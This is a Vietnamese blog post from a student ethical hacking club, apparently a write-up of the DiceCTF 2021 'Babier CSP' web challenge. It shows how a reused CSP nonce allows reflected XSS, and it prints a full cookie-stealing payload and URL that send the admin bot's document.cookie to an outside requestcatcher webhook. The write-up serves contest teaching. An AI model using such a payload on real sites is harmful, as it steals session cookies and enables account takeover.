<!DOCTYPE html><html lang="vi" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="DiceCTF 2021 Web Writeup Babier CSP" /><meta name="author" content="Antoine Hoang" /><meta property="og:locale" content="vi" /><meta name="description" content="BABIER CSP" /><meta property="og:description" content="BABIER CSP" /><link rel="canonical" href="https://fptu-ethical-hackers-club.github.io/posts/DiceCTF-BabierCSP/" /><meta property="og:url" content="https://fptu-ethical-hackers-club.github.io/posts/DiceCTF-BabierCSP/" /><meta property="og:site_name" content="Ethical Hackers Club" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-12T21:00:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="DiceCTF 2021 Web Writeup Babier CSP" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Antoine Hoang" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2021-02-12T21:00:00+07:00","datePublished":"2021-02-12T21:00:00+07:00","description":"BABIER CSP","mainEntityOfPage":{"@type":"WebPage","@id":"https://fptu-ethical-hackers-club.github.io/posts/DiceCTF-BabierCSP/"},"url":"https://fptu-ethical-hackers-club.github.io/posts/DiceCTF-BabierCSP/","@type":"BlogPosting","author":{"@type":"Person","name":"Antoine Hoang"},"headline":"DiceCTF 2021 Web Writeup Babier CSP","@context":"https://schema.org"}</script><title>DiceCTF 2021 | Web Writeup | Babier CSP | Ethical Hackers Club</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ethical Hackers Club"><meta name="application-name" content="Ethical Hackers Club"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.updateMermaid(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ethical Hackers Club</a></div><div class="site-subtitle font-italic">FPT University</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a id="mode-toggle-wrapper" tabindex="0" onclick="flipMode()"> <i class="mode-toggle fas fa-adjust"></i> </a> <span class="icon-border"></span> <a href="https://github.com/FPTU-Ethical-Hackers-Club" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://facebook.com/ehc.fptu" aria-label="facebook" target="_blank" rel="noopener"> <i class="fab fa-facebook"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ehc.fpt','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>DiceCTF 2021 | Web Writeup | Babier CSP</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>DiceCTF 2021 | Web Writeup | Babier CSP</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/antoinenguyen-09">Antoine Hoang</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2021-02-12 21:00:00 +0700" data-toggle="tooltip" data-placement="bottom" title="Fri, Feb 12, 2021, 9:00 PM +0700" >Feb 12</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1020 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><h1 id="babier-csp">BABIER CSP</h1><h2 id="thử-thách">Thử thách:<a href="#thử-thách"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p><a href="https://2020.justctf.team/challenges/14">Baby CSP</a> was too hard for us, try Babier CSP.</p><li><p><a href="https://babier-csp.dicec.tf/">babier-csp.dicec.tf</a></p><li><p><a href="https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp">Admin Bot</a></p><li><p>The admin will set a cookie <code class="language-plaintext highlighter-rouge">secret</code> equal to <code class="language-plaintext highlighter-rouge">config.secret</code> in index.js.</p><li><p>Downloads <code class="language-plaintext highlighter-rouge">index.js</code></p></ul><h2 id="kiến-thức-nền">Kiến thức nền:<a href="#kiến-thức-nền"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>Content Security Policy (CSP).</p><li><p>XSS (Cross-site scripting).</p><li><p>Webhook (Reverse API).</p></ul><h2 id="giải-quyết-vấn-đề">Giải quyết vấn đề:<a href="#giải-quyết-vấn-đề"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="initial-reconnaissance">Initial reconnaissance:<a href="#initial-reconnaissance"><i class="fas fa-hashtag"></i></a></h3></h3><p>Đề bài cho hai trang 1 là của client và 1 là của admin. Check thằng client trước xem sao:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107622961-36c3fd00-6c8b-11eb-8344-05a60fc4db10.png" alt="image" /></p><p>Bấm thử vào cái dòng “View Fruit” liên tục thì nó hiện ra tên các loại Fruit:v</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107623162-80ace300-6c8b-11eb-998b-b69306aa4ab5.png" alt="image" /></p><p>CTRL + U rồi check source code xem:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'#'</span> <span class="na">id=</span><span class="s">elem</span><span class="nt">&gt;</span>View Fruit<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;script </span><span class="na">nonce=</span><span class="s">g+ojjmb9xLfE+3j9PsP/Ig==</span><span class="nt">&gt;</span>
<span class="nx">elem</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/?name=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">([</span><span class="dl">"</span><span class="s2">apple</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">orange</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">pineapple</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">pear</span><span class="dl">"</span><span class="p">][</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">())]);</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Từ source code ta biết được trang web này sẽ random các loại Fruit bao gồm “apple”, “orange”, “pineapple”, “pear” rồi hiển thị tên nó lên mỗi lần mình click vào dòng “View Fruit”. Tên của các fruit này được truyền thông qua GET parameter “name”. Thử inject một vài thứ gì đó vui vui xem nào.</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107624024-d46bfc00-6c8c-11eb-8ccc-7793e966d6e0.png" alt="image" /></p><p>Uầy!! Được luôn nè! Như vậy khả năng cao trang web này bị dính XSS rồi. Tiếp tục khai thác thôi.</p><h3 id="bypassing-csp-to-exploiting-xss">Bypassing CSP to exploiting XSS:<a href="#bypassing-csp-to-exploiting-xss"><i class="fas fa-hashtag"></i></a></h3></h3><p>Vừa đúng lúc ngày hôm qua mới được học về XSS. Tuy nhiên khi check thử vài payload XSS mẫu như <code class="language-plaintext highlighter-rouge">&lt;script&gt; alert(1) &lt;/script&gt;</code> (script hiện dòng cảnh báo có nội dung là “1” ở trên trang web ) thì không thấy gì cả. Check lại source code của trang web thì tôi phát hiện ra 1 điều đáng ngờ:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">nonce=</span><span class="s">'g+ojjmb9xLfE+3j9PsP/Ig=='</span><span class="nt">&gt;</span> <span class="p">...</span> <span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Đây là thẻ script chứa câu lệnh để random các loại fruit rồi print ra. Thẻ này có một thuộc tính mà tôi chưa gặp bao giờ <code class="language-plaintext highlighter-rouge">nonce='g+ojjmb9xLfE+3j9PsP/Ig=='</code>. Thử research 1 chút thì tôi biết được <a href="https://content-security-policy.com/nonce/">“nonce”</a> là một thuộc tính được quy định trong CSP (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content-Security-Policy</a>). Chỉ cần paste url vào <a href="https://csp-evaluator.withgoogle.com/">đây</a> là chúng ta có thể đọc được toàn bộ CSP của trang web đó:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107743763-186e0800-6d44-11eb-814a-631d50616949.png" alt="image" /></p><p>Từ CSP check được ta kết luận rằng tất cả các thẻ trong HTML Document đều không bị “ruled” bởi CSP (vì directive <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src">default-src</a> được set giá trị là “none”), chỉ có duy nhất thẻ script là bị “ruled” (vì <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">script-src</a> được set giá trị là “nonce-g+ojjmb9xLfE+3j9PsP/Ig==”). Điều này có nghĩa là nếu muốn inject một thẻ script vào HTML Document của trang web này, ta phải kèm vào nó một thuộc tính nonce với giá trị là ‘g+ojjmb9xLfE+3j9PsP/Ig==’. Download code javascript (NodeJS) “index.js” từ đề bài, tìm thấy dòng code set giá trị cho thuộc tính “nonce” này bằng phương thức <a href="https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback">randombytes</a>:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kd">const</span>  <span class="nx">NONCE</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">);</span>
</pre></table></code></div></div><p>Nhìn có vẻ như giá trị nonce này sẽ random liên tục và mỗi giá trị nonce sẽ chỉ xuất hiện 1 lần mỗi khi ta refresh lại trang (đúng theo quy tắc là thế). Nhưng bằng 1 cách magic nào đó, refresh cái trang này bao nhiêu lần nonce vẫn giữ nguyên giá trị là ‘g+ojjmb9xLfE+3j9PsP/Ig==’??? Ngon quá, vậy là chỉ cần ốp nguyên cái thằng nonce này vào payload là xong hihi!</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107749166-bb2a8480-6d4c-11eb-886e-cd13a7c47cf3.png" alt="image" /></p><p>Đã xong phần XSS payload. Như vậy chúng ta hoàn toàn có thể tấn công vào trang web này thông qua lỗ hổng Reflected XSS (các bạn có thể tham khảo về các vuln XSS tại <a href="https://ethical-h4ckers-club.blogspot.com/2020/10/xss-co-ban-cors-va-csp.html">đây</a>).</p><h3 id="đánh-cắp-cookie-từ-trang-admin">Đánh cắp cookie từ trang admin:<a href="#đánh-cắp-cookie-từ-trang-admin"><i class="fas fa-hashtag"></i></a></h3></h3><p>Thông thường khi muốn đánh cắp cookie bằng XSS bạn cần host một server đóng vai trò là điểm cuối tiếp nhận request gửi đến từ trang của victim (do payload XSS đã làm thay đổi đường đi của ban đầu request, thay vì đến nơi cần đến, nó sẽ đến server do bạn host và bạn có thể tha hồ đọc nó!). Thật may mắn là tôi có tìm được một site khá tiện lợi mà đơn giản cho phép chúng ta tạo một <a href="https://topdev.vn/blog/webhook-la-gi/">webhook</a> có tên là <a href="https://requestcatcher.com/">requestcatcher</a>. Chỉ cần gõ vài phát là bạn có ngay một cái webhook:D</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107753501-bcf74680-6d52-11eb-89bf-18ca9ecabb71.png" alt="image" /></p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107753550-cda7bc80-6d52-11eb-96e9-88b683c4cb96.png" alt="image" /></p><p>Bây giờ chỉ cần viết lại payload dựa theo CSP đã quy định của trang web:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nt">&lt;/h1&gt;</span>  <span class="c">&lt;!-- đóng thẻ h1 lại vì trong HTML có 1 thẻ &lt;h1&gt; (open) --&gt;</span>
<span class="nt">&lt;script  </span><span class="na">nonce=</span><span class="s">'g+ojjmb9xLfE+3j9PsP/Ig=='</span><span class="nt">&gt;</span>   <span class="o">&lt;!--</span> <span class="nx">mở</span> <span class="nx">thẻ</span> <span class="nx">script</span> <span class="nx">với</span> <span class="nx">giá</span> <span class="nx">trị</span> <span class="nx">nonce</span> <span class="nx">đã</span> <span class="nx">được</span> <span class="nx">quy</span> <span class="nx">định</span> <span class="o">--&gt;</span> 
<span class="nx">scrp_tag</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>  <span class="o">&lt;!--</span> <span class="nx">tạo</span> <span class="nx">đối</span> <span class="nx">tượng</span> <span class="dl">"</span><span class="s2">thẻ script</span><span class="dl">"</span><span class="nx">mới</span> <span class="nx">tên</span> <span class="nx">là</span> <span class="dl">"</span><span class="s2">scrp_tag</span><span class="dl">"</span> <span class="o">--&gt;</span>
<span class="nx">scrp_tag</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://antoine.requestcatcher.com/? flag=</span><span class="dl">'</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">));</span> <span class="o">&lt;!--</span> <span class="nx">chỉnh</span> <span class="nx">attribute</span> <span class="nx">src</span> <span class="nx">của</span> <span class="dl">"</span><span class="s2">scrp_tag</span><span class="dl">"</span> <span class="nx">để</span> <span class="nx">request</span> <span class="nx">của</span> <span class="nx">admin</span> <span class="nx">bot</span> <span class="nx">được</span> <span class="nx">redirect</span> <span class="nx">đến</span> <span class="nx">webhook</span> <span class="nx">mà</span> <span class="nx">ta</span> <span class="nx">đã</span> <span class="nx">tạo</span> <span class="nx">và</span> <span class="nx">chứa</span> <span class="nx">trong</span> <span class="nx">đó</span> <span class="nx">tham</span> <span class="nx">số</span> <span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span> <span class="nx">được</span> <span class="nx">gán</span> <span class="nx">bằng</span> <span class="nx">cookie</span> <span class="nx">của</span> <span class="nx">admin</span> <span class="nx">bot</span> <span class="o">--&gt;</span> 
<span class="nx">scrp_tag</span><span class="p">.</span><span class="nx">nonce</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">g+ojjmb9xLfE+3j9PsP/Ig==</span><span class="dl">'</span> <span class="o">&lt;!--</span> <span class="nx">setup</span> <span class="nx">attribute</span> <span class="nx">nonce</span> <span class="nx">của</span> <span class="dl">"</span><span class="s2">scrp_tag</span><span class="dl">"</span> <span class="nx">cho</span> <span class="nx">phù</span> <span class="nx">hợp</span> <span class="nx">với</span> <span class="nx">CSP</span> <span class="o">--&gt;</span>
<span class="nx">contain_tag</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">body</span><span class="dl">"</span><span class="p">);</span> <span class="o">&lt;!--</span> <span class="nx">tham</span> <span class="nx">chiếu</span> <span class="nx">đến</span> <span class="nx">thẻ</span> <span class="nx">body</span> <span class="nx">của</span> <span class="nx">HTML</span> <span class="nx">Document</span> <span class="o">--&gt;</span>
<span class="nx">contain_tag</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">scrp_tag</span><span class="p">);</span> <span class="o">&lt;!--</span> <span class="nx">thêm</span> <span class="dl">"</span><span class="s2">scrp_tag</span><span class="dl">"</span> <span class="nx">vào</span> <span class="nx">body</span> <span class="nx">của</span> <span class="nx">HTML</span> <span class="nx">Document</span> <span class="nx">để</span> <span class="nx">thực</span> <span class="nx">thi</span> <span class="nx">script</span> <span class="o">--&gt;</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/h1&gt;</span>
</pre></table></code></div></div><p>Cuối cùng chúng nhúng cái payload này vào link babier-csp.dicec.tf (vì Admin chỉ evaluate một mình cái link này) bằng cách gán nó vào parameter name:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://babier-csp.dicec.tf/?name=&lt;/h1&gt;&lt;script nonce='g+ojjmb9xLfE+3j9PsP/Ig=='&gt;scrp_tag = document.createElement('script'); scrp_tag.nonce = 'g+ojjmb9xLfE+3j9PsP/Ig=='; scrp_tag.src = 'https://antoine.requestcatcher.com/?xss='.concat(JSON.stringify(document.cookie)); contain_tag = document.querySelector("body"); contain_tag.appendChild(scrp_tag);&lt;/script&gt;&lt;/h1&gt;
</pre></table></code></div></div><p>Well well well, hãy xem chúng ta có gì ở webhook <code class="language-plaintext highlighter-rouge">https://antoine.requestcatcher.com/</code> sau khi submit cái link đó ở Admin Bot:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107759051-5544f980-6d5a-11eb-8655-28f9603c037d.png" alt="image" /></p><p>Kết quả trả về ở tham số “flag” là một tham số khác có tên là “secret”. Cái tên này nghe khá là quen, hình như mình gặp đâu đó rồi…Hmmm, đây rồi, ngay trong souce code “index.js”:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kd">const</span>  <span class="nx">SECRET</span> <span class="o">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">secret</span><span class="p">;</span>
 <span class="c1">// to be continued...</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">SECRET</span><span class="p">,</span> <span class="nx">express</span><span class="p">.</span><span class="kd">static</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/secret</span><span class="dl">"</span><span class="p">));</span>
</pre></table></code></div></div><p>Hằng SECRET được gán bằng “config.secret”, có khả năng “config.secret” là tham số “secret”. Đáng chú ý nhất là hàm <a href="http://expressjs.com/en/guide/using-middleware.html#middleware.built-in">middleware</a> <a href="https://expressjs.com/en/4x/api.html#express.static">express.static</a> - một hàm chuyên dùng để đọc và xử lý các nội dung tĩnh như file HTML, ảnh… Có thể tạm hiểu rằng sử dụng đường dẫn với token <code class="language-plaintext highlighter-rouge">4b36b1b8e47f761263796b1defd80745</code> trong request mà ta bắt được sẽ dẫn tới file “secret” của server:</p><p><code class="language-plaintext highlighter-rouge">https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/</code></p><p>Truy cập URL này ta thu được:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/107773599-7adcfd80-6d70-11eb-8db4-00b3a14453a6.png" alt="image" /></p><p>Yolo!! CTRL + U rồi lấy flag thôi hehe:</p><blockquote><p>dice{web_1s_a_stat3_0f_grac3_857720}</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web-challenges/'>Web Challenges</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/dicectf21/" class="post-tag no-text-decoration" >dicectf21</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=DiceCTF 2021 | Web Writeup | Babier CSP - Ethical Hackers Club&url=https://fptu-ethical-hackers-club.github.io/posts/DiceCTF-BabierCSP/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=DiceCTF 2021 | Web Writeup | Babier CSP - Ethical Hackers Club&u=https://fptu-ethical-hackers-club.github.io/posts/DiceCTF-BabierCSP/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=DiceCTF 2021 | Web Writeup | Babier CSP - Ethical Hackers Club&url=https://fptu-ethical-hackers-club.github.io/posts/DiceCTF-BabierCSP/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h4>Recent Update</h4><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/SVATTT-Crypto/">ASCIS (ASEAN Student Contest on Information Security) 's Cryptography Write-ups</a><li><a href="/posts/SVATTT-Web/">ASCIS (ASEAN Student Contest on Information Security) 's Web Write-ups</a><li><a href="/posts/FuSec3-Forensics/">FPTU SecAthon 2020 | Forensics Writeup | FRS301</a><li><a href="/posts/ACSC2021-Forensics/">Asian Cyber Security Challenge 2021 | Forensics Writeup | Nyong Coin, BitLocker Artifact</a><li><a href="/posts/FuSec4-CRY302-CRY303/">FPTU SecAthon 2021 | Cryptographic Writeup | CRY302 & CRY303</a></ul></div><div id="access-tags"><h4 class="text-muted">Trending Tags</h4><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/wiki/">wiki</a> <a class="post-tag" href="/tags/fusec21/">fusec21</a> <a class="post-tag" href="/tags/cryptographic/">cryptographic</a> <a class="post-tag" href="/tags/fusec20/">fusec20</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/acsc21/">acsc21</a> <a class="post-tag" 